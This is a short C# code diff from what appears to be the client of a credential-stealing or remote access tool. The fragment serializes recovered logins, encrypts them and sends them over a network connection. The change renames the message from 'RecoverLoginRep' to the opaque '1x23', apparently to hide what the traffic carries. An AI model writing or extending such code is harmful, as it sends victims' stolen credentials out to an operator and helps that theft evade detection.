@@ -42,7 +42,7 @@ namespace Client.Core.Events
 
             if(NetworkManager.IsConnected)
             {
-                NetworkManager.Connection.SendObject("RecoverLoginRep", Cryptography.Encrypt(JsonConvert.SerializeObject(logins.ToArray())));
+                NetworkManager.Connection.SendObject("1x23", Cryptography.Encrypt(JsonConvert.SerializeObject(logins.ToArray())));
             }
         }
     }
